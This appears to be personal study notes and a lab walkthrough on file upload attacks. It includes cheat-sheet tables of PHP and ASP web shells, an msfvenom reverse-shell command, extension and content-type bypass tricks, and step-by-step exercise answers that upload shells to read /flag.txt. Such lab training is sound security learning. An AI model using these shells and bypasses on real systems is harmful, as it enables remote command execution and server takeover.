# Intro to File Upload Attacks
Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.
However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it.

## Types of File Upload Attacks

The most common reason behind file upload vulnerabilities is weak file validation and verification, which may not be well secured to prevent unwanted file types or could be missing altogether. The worst possible kind of file upload vulnerability is an `unauthenticated arbitrary file upload` vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.

Many web developers employ various types of tests to validate the extension or content of the uploaded file. However, as we will see in this module, if these filters are not secure, we may be able to bypass them and still reach arbitrary file uploads to perform our attacks.

The most common and critical attack caused by arbitrary file uploads is `gaining remote command execution` over the back-end server by uploading a web shell or uploading a script that sends a reverse shell. A web shell, as we will discuss in the next section, allows us to execute any command we specify and can be turned into an interactive shell to enumerate the system easily and further exploit the network. It may also be possible to upload a script that sends a reverse shell to a listener on our machine and then interact with the remote server that way.

In some cases, we may not have arbitrary file uploads and may only be able to upload a specific file type. Even in these cases, there are various attacks we may be able to perform to exploit the file upload functionality if certain security protections were missing from the web application.

Examples of these attacks include:
- Introducing other vulnerabilities like `XSS` or `XXE`.
- Causing a `Denial of Service (DoS)` on the back-end server.
- Overwriting critical system files and configurations.
- And many others.

When the validation for the file type in upload functionality happens on the client side NOT on the server side, we can easily bypass this restriction by changing the code using dev tools in browser. So if all validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting our file- we should be able to have complete control over these client-side validations.

# Commands
| **Web Shell**                                                                           | **Description**                       |
| --------------------------------------------------------------------------------------- | ------------------------------------- |
| `<?php file_get_contents('/etc/passwd'); ?>`                                            | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                          | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                                    | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                             | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`          | Generate PHP reverse shell            |
| [PHP Web Shell](https://github.com/Arrexel/phpbash)                                     | PHP Web Shell                         |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                 | PHP Reverse Shell                     |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**                                                                                                                                | **Description**                              |
| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| **Client-Side Bypass**                                                                                                                     |                                              |
| `[CTRL+SHIFT+C]`                                                                                                                           | Toggle Page Inspector                        |
| **Blacklist Bypass**                                                                                                                       |                                              |
| `shell.phtml`                                                                                                                              | Uncommon Extension                           |
| `shell.pHp`                                                                                                                                | Case Manipulation                            |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions                       |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)                | List of ASP Extensions                       |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)                          | List of Web Extensions                       |
| **Whitelist Bypass**                                                                                                                       |                                              |
| `shell.jpg.php`                                                                                                                            | Double Extension                             |
| `shell.php.jpg`                                                                                                                            | Reverse Double Extension                     |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`                                                                                          | Character Injection - Before/After Extension |
| **Content/Type Bypass**                                                                                                                    |                                              |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)                             | List of Web Content-Types                    |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)                    | List of All Content-Types                    |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)                                                                   | List of File Signatures/Magic Bytes          |

## Limited Uploads

| **Potential Attack** | **File Types**          |
| -------------------- | ----------------------- |
| `XSS`                | HTML, JS, SVG, GIF      |
| `XXE`/`SSRF`         | XML, SVG, PDF, PPT, DOC |
| `DoS`                | ZIP, JPG, PNG           |

# Questions & Answers
### Absent Validation
1.  Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.
Create basic php webshell:
```
<?php system($_REQUEST['cmd']); ?>
```
upload it, then go to
```
/uploads/shell.php?=cmd=andheretypecommands

http://94.237.59.199:54252/uploads/shell.php?cmd=cat+/flag.txt
```

### Upload Exploitation
2. Try to exploit the upload feature to upload a web shell and get the content of /flag.txt 

create a php web shell
```
<?php system($_REQUEST['cmd']); ?>
 
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

Then simply change the =id to cat+/flag.txt
```
http://SERVER_IP:PORT/uploads/shell.php?cmd=cat+/flag.txt
```


### Client-Side Validation
3.  Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)

First inspect the source code and find the lines which are responsible for allowed upload extensions:
```
 <input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png">
```

Then in order to upload php web shell we need to add .php to the end of accept parameter so:
```
<input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png,.php">
```

Then go to debugger section in devtools and find these code:
```
function validate() {
  var file = $('#uploadFile') [0].files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();
  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text('Only images are allowed!');
    File.form.reset();
    $('#submit').attr('disabled', true);
    return false;
  } else {
    return true;
  }
}
```

Then ignore these lines:
```
if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text('Only images are allowed!');
    File.form.reset();
    $('#submit').attr('disabled', true);
    return false;
  } else {
    return true;
  }
```

After that return to index.html and find where uploaded photos are shown:
```
<img src="/profile_images/Untitled-1.png" class="profile-image" id="profile-image">
```

so it is http//IP:PORT/profile_images/...

After all that restrictions that we disabled, try to upload shell.php
```
<?php system($_REQUEST['cmd']); ?>
```
to the main website

After that go to http//IP:PORT/profile_images/shell.php
and add ?cmd=YOUR_COMMANDS to interact with web shell, so it look like this:
```
http//IP:PORT/profile_images/shell.php?cmd=cat+/flag.txt  
```
to read the content of flag.txt file in the / directory

### Blacklisted Filters
4. Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read “/flag.txt”.

First we upload ordinary photo with .png or .jpg extension

Then we intercept our request at http://IP:PORT/upload.php with burp

Then we change filename to shell.php and add php webshell script, so it will look like this:

```
POST /upload.php HTTP/1.1
Host: 94.237.59.193:57013
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.193:57013/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------151835042424590523114032504347
Content-Length: 260
Origin: http://94.237.59.193:57013
DNT: 1
Connection: close
-----------------------------151835042424590523114032504347
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
-----------------------------151835042424590523114032504347--
```
Then we send this request to intruder and ass fuzzing parameter to ".php" and in payload select /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
and un-tick encoding and start attack

Once our attack finished we can list result by length(since all of them returned with 200 OK code) and here we can notice that there are a lot of php extensions that came back with “File successfully uploaded”. Here i tried php2,php3,….. and lastly phar worked. So, we upload our shell as .phar file and then execute our command(as w
e did earlier we can learn the directory of uploaded shell by reading the source code).

Then go to http://IP:PORT/profile_images/shell.phar?cmd=cat+/flag.txt and get flag.txt

### Whitelist Filters
5. The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt" 

First we also ffuz for extensions, after finding that .phar is working: shell.phar.jpeg

Then we intercept the request, change the file name to shell.phar.jpeg, and insert phpwebshell as in prev example and making sure that content-type is also image/jpeg

After that we go as usual to http://IP:PORT/profile_images/shell.phar.jpg?cmd=cat+/flag.txt to get the content of flag immediately, cuz we already know how to perform these commands
